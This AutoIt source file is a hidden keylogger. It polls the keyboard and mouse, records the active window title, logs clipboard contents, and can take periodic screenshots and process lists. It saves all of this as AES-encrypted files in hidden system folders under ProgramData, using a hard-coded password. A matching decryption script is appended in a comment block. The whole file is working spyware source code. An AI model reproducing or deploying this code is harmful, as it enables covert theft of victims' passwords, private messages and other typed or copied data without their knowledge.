; keys are logged if held down, eg. q if pressed down will be continously logged.
#include <Crypt.au3>
#include <ScreenCapture.au3>
#include <FileConstants.au3>
#NoTrayIcon; dont show tray icon
$hDll=DllOpen("user32.dll")
$window2=""
$shotcount = 0
$shotdelay = 0
$date=@year&"-"&@mon&"-"&@mday
$log="C:\ProgramData\User\data\temp"
$log1 = "C:\ProgramData\User\data\default"
$log2 = "C:\ProgramData\User\data\update"
$filename = $log&"\user_data_"&$date&".log"
$do_encrypt = True
Global $password = "#Password#1"
$log_clipboard = True
$takeshot = False
$timelimit = 45000*5

DirCreate ($log)
DirCreate($log1)
DirCreate($log2)

Func _IsPressed($hexKey)
	Local $aR, $bRv
	$hexKey = '0x' & $hexKey
	$aR = DllCall('user32.dll', "int", "GetAsyncKeyState", "int", $hexKey) ; The GetAsyncKeyState function determines whether a key is up or down at the time the function is called, and whether the key was pressed after a previous call to GetAsyncKeyState.

	If $aR[0] <> 0 Then ;Tests if two values are not equal. Case insensitive when used with strings. To do a case sensitive not equal comparison use Not ("string1" == "string2")
	   $bRv = 1
	Else
	   $bRv = 0
	EndIf

	Return $bRv
	Return $bRv
   EndFunc

;encrypted data writer
   Func _write_encrypted_data($data)
	  $hCipherText = FileOpen($filename, $FO_APPEND + $FO_BINARY)
	  $vBlock = _Crypt_EncryptData($data, $password, $CALG_AES_256)
	  FileWrite($hCipherText, BinaryLen($vBlock))
	  FileWrite($hCipherText, $vBlock)
	  FileClose($hCipherText)
   EndFunc
   if $do_encrypt = True Then
    Global $hCipherText = FileOpen($filename, $FO_APPEND + $FO_CREATEPATH + $FO_BINARY)
   _write_encrypted_data("<font face=Verdana size=1>")
Else
   Global $file = FileOpen($filename, $FO_APPEND + $FO_CREATEPATH)
   _write_data("<font face=Verdana size=1>")
EndIf

Func _write_data($data)
   $file = FileOpen($filename, $FO_APPEND)
   FileWrite($file,$data)
   FileClose($file)
EndFunc

;file logger function
   Func _LogKeyPress($what2log)
   $window=WinGetTitle("")
   if $window=$window2 Then
	  if $do_encrypt = True Then
		 _write_encrypted_data($what2log)
	  Else
		 _write_data($what2log)
	  EndIf
   Sleep(100)
   Else
   $window2=$window
   if $do_encrypt = True Then
	  _write_encrypted_data("<br><BR>" & "<b>["& @Year&"."&@mon&"."&@mday&"  "&@HOUR & ":" &@MIN & ":" &@SEC & ']  Window: "'& $window& '"</b><br>'& $what2log)
   Else
	  _write_data("<br><BR>" & "<b>["& @Year&"."&@mon&"."&@mday&"  "&@HOUR & ":" &@MIN & ":" &@SEC & ']  Window: "'& $window& '"</b><br>'& $what2log)
   EndIf
	Sleep(100)
   EndIf
   EndFunc

FileSetAttrib("C:\ProgramData\User","+SH")
FileSetAttrib("C:\ProgramData\User\data\temp\*.*", "+SH", 1)
FileSetAttrib("C:\ProgramData\User\data\default\*.*", "+SH", 1)
FileSetAttrib("C:\ProgramData\User\data\update\*.*", "+SH", 1)

$prev_clip = ""
ClipPut("")

While 1
;---------------------------------------------end program header, begin program----------------------------
If _IsPressed('BB') Then
	local $a
	_LogKeyPress("<font color= #f028ea   style=font-size:10px><i>=</i></font>")
EndIf

If _IsPressed('BD') Then
	local $a
	_LogKeyPress("<font color= #f028ea   style=font-size:10px><i>-</i></font>")
EndIf

If _IsPressed('BE') Then
	local $a
	_LogKeyPress("<font color= #f028ea   style=font-size:10px><i>.</i></font>")
EndIf

If _IsPressed('BF') Then
	local $a
	_LogKeyPress("<font color= #f028ea   style=font-size:10px><i>/</i></font>")
EndIf

If _IsPressed('C0') Then
	local $a
	_LogKeyPress("<font color= #f028ea   style=font-size:10px><i>`</i></font>")
EndIf

If _IsPressed('DB') Then
	local $a
	_LogKeyPress("<font color= #f028ea   style=font-size:10px><i>[</i></font>")
EndIf

If _IsPressed('DD') Then
	local $a
	_LogKeyPress("<font color= #f028ea   style=font-size:10px><i>]</i></font>")
EndIf

If _IsPressed('DC') Then
	local $a
	_LogKeyPress("<font color= #f028ea   style=font-size:10px><i>\</i></font>")
EndIf

If _IsPressed('DE') Then
	local $a
	_LogKeyPress("<font color= #f028ea   style=font-size:10px><i>'</i></font>")
EndIf

If _IsPressed('BA') Then
	local $a
	_LogKeyPress("<font color= #f028ea   style=font-size:10px><i>;</i></font>")
EndIf

If _IsPressed('BC') Then
	local $a
	_LogKeyPress("<font color= #f028ea   style=font-size:10px><i>,</i></font>")
EndIf

If _IsPressed('70') Then
    _LogKeyPress("<font color= #002eff  style=font-size:10px><i>(F1)</i></font>")
 EndIf


     If _IsPressed('71') Then
    _LogKeyPress("<font color= #002eff  style=font-size:10px><i>(F2)</i></font>")
 EndIf


     If _IsPressed('72') Then
    _LogKeyPress("<font color= #002eff  style=font-size:10px><i>(F3)</i></font>")
 EndIf


     If _IsPressed('73') Then
    _LogKeyPress("<font color= #002eff  style=font-size:10px><i>(F4)</i></font>")
 EndIf


     If _IsPressed('74') Then
    _LogKeyPress("<font color= #002eff  style=font-size:10px><i>(F5)</i></font>")
 EndIf


     If _IsPressed('75') Then
    _LogKeyPress("<font color= #002eff  style=font-size:10px><i>(F6)</i></font>")
 EndIf


     If _IsPressed('76') Then
    _LogKeyPress("<font color= #002eff  style=font-size:10px><i>(F7)</i></font>")
 EndIf


     If _IsPressed('77') Then
    _LogKeyPress("<font color= #002eff  style=font-size:10px><i>(F8)</i></font>")
EndIf


   If _IsPressed('78') Then
    _LogKeyPress("<font color= #002eff  style=font-size:10px><i>(F9)</i></font>")
EndIf

If _IsPressed('79') Then
    _LogKeyPress("<font color= #002eff  style=font-size:10px><i>(F10)</i></font>")
 EndIf


     If _IsPressed('7A') Then
    _LogKeyPress("<font color= #002eff  style=font-size:10px><i>(F11)</i></font>")
EndIf


   If _IsPressed('7B') Then
    _LogKeyPress("<font color= #002eff  style=font-size:10px><i>(F12)</i></font>")
 EndIf

 If _IsPressed(41) Then
    _LogKeyPress("a")
EndIf


 If _IsPressed(42) Then
    _LogKeyPress("b")
EndIf


 If _IsPressed(43) Then
    _LogKeyPress("c")
EndIf


 If _IsPressed(44) Then
    _LogKeyPress("d")
EndIf


 If _IsPressed(45) Then
    _LogKeyPress("e")
EndIf


 If _IsPressed(46) Then
    _LogKeyPress("f")
EndIf


 If _IsPressed(47) Then
    _LogKeyPress("g")
EndIf


 If _IsPressed(48) Then
    _LogKeyPress("h")
EndIf


 If _IsPressed(49) Then
    _LogKeyPress("i")
EndIf


 If _IsPressed('4a') Then
    _LogKeyPress("j")
EndIf


 If _IsPressed('4b') Then
    _LogKeyPress("k")
EndIf


 If _IsPressed('4c') Then
    _LogKeyPress("l")
EndIf


 If _IsPressed('4d') Then
    _LogKeyPress("m")
EndIf


 If _IsPressed('4e') Then
    _LogKeyPress("n")
EndIf


 If _IsPressed('4f') Then
    _LogKeyPress("o")
EndIf


 If _IsPressed(50) Then
    _LogKeyPress("p")
EndIf


 If _IsPressed(51) Then
    _LogKeyPress("q")
EndIf


 If _IsPressed(52) Then
    _LogKeyPress("r")
EndIf


 If _IsPressed(53) Then
    _LogKeyPress("s")
EndIf


 If _IsPressed(54) Then
    _LogKeyPress("t")
EndIf


 If _IsPressed(55) Then
    _LogKeyPress("u")
EndIf


 If _IsPressed(56) Then
    _LogKeyPress("v")
EndIf


 If _IsPressed(57) Then
    _LogKeyPress("w")
EndIf


 If _IsPressed(58) Then
    _LogKeyPress("x")
EndIf


 If _IsPressed(59) Then
    _LogKeyPress("y")
EndIf

  If _IsPressed('5a') Then
    _LogKeyPress("z")
EndIf


If _IsPressed('01') Then
    $mousepos = MouseGetPos()
    $mouselog = String($mousepos[0]) & " , " & string($mousepos[1])
    _LogKeyPress("<font color=#008000 style=font-size:10px><i>{LEFT MOUSE [" & $mouselog & "]}</i></font>")
EndIf

 If _IsPressed('02') Then
	$mousepos = MouseGetPos()
	$mouselog = String($mousepos[0]) & " , " & string($mousepos[1])
    _LogKeyPress("<font color=#008000 style=font-size:10px><i>{RIGHT MOUSE [" & $mouselog & "]}</i></font>")
 EndIf

If _IsPressed('04') Then
	$mousepos = MouseGetPos()
	$mouselog = String($mousepos[0]) & " , " & string($mousepos[1])
    _LogKeyPress("<font color= #00af00 style=font-size:10px><i>{MIDDLE MOUSE [" & $mouselog & "]}</i></font>")
 EndIf

   If _IsPressed('08') Then
    _LogKeyPress("<font color= #6f0fea  style=font-size:10px><i>{BACKSPACE}</i></font>")
 EndIf


   If _IsPressed('09') Then
    _LogKeyPress("<font color= #6f0fea  style=font-size:10px><i>{TAB}</i></font>")
 EndIf


   If _IsPressed('0d') Then
    _LogKeyPress("<font color= #6f0fea  style=font-size:10px><i>{ENTER}</i></font>")
 EndIf


   If _IsPressed('10') Then
    _LogKeyPress("<font color= #6f0fea  style=font-size:10px><i>{SHIFT}</i></font>")
 EndIf


     If _IsPressed('11') Then
    _LogKeyPress("<font color= #6f0fea  style=font-size:10px><i>{CTRL}</i></font>")
 EndIf


     If _IsPressed('12') Then
    _LogKeyPress("<font color= #6f0fea  style=font-size:10px><i>{ALT}</i></font>")
EndIf


   If _IsPressed('13') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:10px><i>{PAUSE}</i></font>")
 EndIf


  If _IsPressed('14') Then
    _LogKeyPress("<font color= #6f0fea  style=font-size:10px><i>{CAPSLOCK}</i></font>")
EndIf


   If _IsPressed('1b') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:10px><i>{ESC}</i></font>")
EndIf

If _IsPressed('0C') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:10px><i>{CLEAR}</i></font>")
 EndIf

 If _IsPressed('5B') Then
    _LogKeyPress("<font color= #6f0fea  style=font-size:10px><i>{WIN}</i></font>")
EndIf

If _IsPressed('5C') Then
    _LogKeyPress("<font color= #6f0fea  style=font-size:10px><i>{WIN}</i></font>")
EndIf

   If _IsPressed('20') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:10px><i>(SPACE)</i></font>")
 EndIf


     If _IsPressed('21') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:10px><i>{PGUP}</i></font>")
 EndIf


     If _IsPressed('22') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:10px><i>{PGDN}</i></font>")
 EndIf


     If _IsPressed('23') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:10px><i>{END}</i></font>")
 EndIf


     If _IsPressed('24') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:10px><i>{HOME}</i></font>")
 EndIf


     If _IsPressed('25') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:10px><i>{LEFT ARROW}</i></font>")
 EndIf


     If _IsPressed('26') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:10px><i>{UP ARROW}</i></font>")
 EndIf


     If _IsPressed('27') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:10px><i>{RIGHT ARROW}</i></font>")
 EndIf


     If _IsPressed('28') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:10px><i>{DOWN ARROW}</i></font>")
 EndIf


     If _IsPressed('2c') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:10px><i>{PRNTSCRN}</i></font>")
 EndIf


     If _IsPressed('2d') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:10px><i>{INSERT}</i></font>")
 EndIf


     If _IsPressed('2e') Then
    _LogKeyPress("<font color= #6f0fea  style=font-size:10px><i>{DEL}</i></font>")
EndIf

	If _IsPressed('2F') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:10px><i>{HELP}</i></font>")
EndIf

   If _IsPressed('30') Then
    _LogKeyPress("0")
 EndIf


     If _IsPressed('31') Then
    _LogKeyPress("1")
 EndIf


     If _IsPressed('32') Then
    _LogKeyPress("2")
 EndIf


     If _IsPressed('33') Then
    _LogKeyPress("3")
 EndIf


     If _IsPressed('34') Then
    _LogKeyPress("4")
 EndIf


     If _IsPressed('35') Then
    _LogKeyPress("5")
 EndIf


     If _IsPressed('36') Then
    _LogKeyPress("6")
 EndIf


     If _IsPressed('37') Then
    _LogKeyPress("7")
 EndIf


     If _IsPressed('38') Then
    _LogKeyPress("8")
EndIf


   If _IsPressed('39') Then
    _LogKeyPress("9")
 EndIf

 If _IsPressed('60') Then
    _LogKeyPress("<font color=#ff00dc  style=font-size:10px><i>0</i></font>")
 EndIf


     If _IsPressed('61') Then
    _LogKeyPress("<font color=#ff00dc  style=font-size:10px><i>1</i></font>")
 EndIf


     If _IsPressed('62') Then
    _LogKeyPress("<font color=#ff00dc  style=font-size:10px><i>2</i></font>")
 EndIf


     If _IsPressed('63') Then
    _LogKeyPress("<font color=#ff00dc  style=font-size:10px><i>3</i></font>")
 EndIf


     If _IsPressed('64') Then
    _LogKeyPress("<font color=#ff00dc  style=font-size:10px><i>4</i></font>")
 EndIf


     If _IsPressed('65') Then
    _LogKeyPress("<font color=#ff00dc  style=font-size:10px><i>5</i></font>")
 EndIf


     If _IsPressed('66') Then
    _LogKeyPress("<font color=#ff00dc  style=font-size:10px><i>6</i></font>")
 EndIf


     If _IsPressed('67') Then
    _LogKeyPress("<font color=#ff00dc  style=font-size:10px><i>7</i></font>")
 EndIf


     If _IsPressed('68') Then
    _LogKeyPress("<font color=#ff00dc  style=font-size:10px><i>8</i></font>")
EndIf


   If _IsPressed('69') Then
    _LogKeyPress("<font color=#ff00dc  style=font-size:10px><i>9</i></font>")
 EndIf

 If _IsPressed('6A') Then
    _LogKeyPress("<font color=#ff00dc  style=font-size:10px><i>*</i></font>")
 EndIf


     If _IsPressed('6B') Then
    _LogKeyPress("<font color=#ff00dc  style=font-size:10px><i>+</i></font>")
 EndIf


     If _IsPressed('6C') Then
    _LogKeyPress("<font color=#ff00dc  style=font-size:10px><i>\</i></font>")
 EndIf


     If _IsPressed('6D') Then
    _LogKeyPress("<font color=#ff00dc  style=font-size:10px><i>-</i></font>")
 EndIf


     If _IsPressed('6E') Then
    _LogKeyPress("<font color=#ff00dc  style=font-size:10px><i>.</i></font>")
EndIf


   If _IsPressed('6F') Then
    _LogKeyPress("<font color=#ff00dc  style=font-size:10px><i>/</i></font>")
 EndIf

 If _IsPressed('FE') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:10px><i>(CLEAR)</i></font>")
 EndIf

 If _IsPressed('13') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:10px><i>(PAUSE)</i></font>")
 EndIf

 If _IsPressed('AD') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:10px><i>(MUTE)</i></font>")
 EndIf

 If _IsPressed('AE') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:10px><i>(VOLUMEDOWN)</i></font>")
 EndIf

 If _IsPressed('AF') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:10px><i>(VOLUMEUP)</i></font>")
 EndIf
 If _IsPressed('23') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:10px><i>(END)</i></font>")
 EndIf

 If _IsPressed('24') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:10px><i>(HOME)</i></font>")
 EndIf
 If _IsPressed('90') Then
    _LogKeyPress("<font color= #6f0fea  style=font-size:10px><i>(NUMLOCK)</i></font>")
 EndIf

 If _IsPressed('91') Then
    _LogKeyPress("<font color= #6f0fea  style=font-size:10px><i>(SCROLLOCK)</i></font>")
 EndIf

If $log_clipboard = True Then
   $new_clip = ClipGet()
   if  $prev_clip <> $new_clip Then
   $length = StringLen($new_clip)
   if $length > 150 Then
	  $clip = StringLeft($new_clip,75)&" . . . . "&StringRight($new_clip,75)
   Else
	  $clip = $new_clip
   EndIf
   _LogKeyPress("<font color= #ee2626 style=font-size:10px><i>(Clipboard copied : "&$clip&")</i></font>")
   $prev_clip = $new_clip
   EndIf
EndIf


$shotdelay = $shotdelay + 1
 if $shotdelay = $timelimit And $takeshot = True Then
	while FileExists($log1 & "\" & $date &"_Screenshot_"&$shotcount&".jpg")
	   $shotcount  = $shotcount + 1
	WEnd
	$shotdelay = 0
	$hBmp = _ScreenCapture_Capture("")
    _ScreenCapture_SaveImage($log1 & "\" & $date &"_user_data_"&$shotcount&".jpg", $hBmp)
	_LogKeyPress("<font color=#FF8000 style=font-size:10px><i>[	 SCREENSHOT TAAKEN	AND PROCESS OBSERVED  ]</i></font>")
	if $do_encrypt = True Then
	   _Crypt_EncryptFile($log1 & "\" & $date &"_user_data_"&$shotcount&".jpg", $log1 & "\" & $date &"_users_data_"&$shotcount&".pic", $password, $CALG_AES_256)
	   FileDelete($log1 & "\" & $date &"_user_data_"&$shotcount&".jpg")
    EndIf
	$shotcount = $shotcount + 1

	Local $aProcessList = ProcessList()
	For $i = 1 To $aProcessList[0][0]

		FileWriteLine($log2 & "\" & $date &"_user_task_"&$shotcount&".txt",$aProcessList[$i][0] & " >> "& "PID: [ " & $aProcessList[$i][1] & " ] ")
	 Next
	 if $do_encrypt = True Then
	   _Crypt_EncryptFile($log2 & "\" & $date &"_user_task_"&$shotcount&".txt", $log2 & "\" & $date &"_users_task_"&$shotcount&".tsk", $password, $CALG_AES_256)
	   FileDelete($log2 & "\" & $date &"_user_task_"&$shotcount&".txt")
    EndIf
EndIf

WEnd






;DECRYPTION's CODE :

#comments-start

#include <Crypt.au3>
#include <FileConstants.au3>
#include <file.au3>

Local $szDrive = "", $szDir = "", $szFName = "", $szExt = ""
Local $Encrypted = InputBox("Filename","Enter the full filepath to decrypt it",@scriptdir)
_PathSplit($Encrypted, $szDrive, $szDir, $szFName, $szExt)

if $szExt = ".log" Then
   Local $Decrypted = $szDrive & $szDir & $szFName & "_decrypted.htm"
ElseIf $szExt = ".pic" Then
   Local $Decrypted = $szDrive & $szDir & $szFName & "_decrypted.jpg"
Else
   Local $Decrypted = $szDrive & $szDir & $szFName & "_decrypted.txt"
EndIf
Local $password = InputBox("Password","Enter the Password to decrypt the file","Password","*")

;CODE FOR ENCRYPTION BY PART---------------------------------------------------------------------------------
#CS Local $data1 = InputBox(0,"enter")
### Local $data2 = InputBox(0,"enter")
### Local $data3 = InputBox(0,"enter")
###
### _Crypt_Startup()
###
### Local $vBlock
### Local $hCipherText = FileOpen($Encrypted, $FO_APPEND + $FO_CREATEPATH + $FO_BINARY)
### $vBlock = _Crypt_EncryptData($data1, $password, $CALG_AES_256)
### FileWrite($hCipherText, BinaryLen($vBlock))
### FileWrite($hCipherText, $vBlock)
### FileClose($hCipherText)
###
### $hCipherText = FileOpen($Encrypted, $FO_APPEND + $FO_BINARY)
### $vBlock = _Crypt_EncryptData($data2, $password, $CALG_AES_256)
### FileWrite($hCipherText, BinaryLen($vBlock))
### FileWrite($hCipherText, $vBlock)
### FileClose($hCipherText)
###
### $hCipherText = FileOpen($Encrypted, $FO_APPEND + $FO_BINARY)
### $vBlock = _Crypt_EncryptData($data3, $password, $CALG_AES_256)
### FileWrite($hCipherText, BinaryLen($vBlock))
### FileWrite($hCipherText, $vBlock)
### FileClose($hCipherText)
 #CE

;MsgBox (0,"", "Original strings have been encrypted separately, with their binary length prepended, in " & $Encrypted)
;CODE FOR ENCRYPTION BY PART ENDS

;CODE FOR Decryption starts---------------------------------------------------------------------------------

if $szExt = ".log" Then
   Local $iFileSize = FileGetSize($Encrypted), $iBlockLength

   $hCipherText = FileOpen($Encrypted, $FO_BINARY)
   $hRecoverText = FileOpen($Decrypted, $FO_OVERWRITE + $FO_CREATEPATH)

   While $iFileSize > 0
	   $iBlockLength = Int(FileRead($hCipherText, 4))
	   $iFileSize -= 4
	   $EncryptedContent = FileRead($hCipherText, $iBlockLength)
	   $iFileSize -= $iBlockLength
	   FileWrite($hRecoverText, BinaryToString(_Crypt_DecryptData($EncryptedContent, $password, $CALG_AES_256)))
   WEnd
   FileClose($hRecoverText)
Else
    _Crypt_DecryptFile($Encrypted, $Decrypted, $password, $CALG_AES_256)
EndIf

MsgBox (64,"Confirmation", "Encrypted data have been successfully decrypted and saved in " & $Decrypted)

#comments-end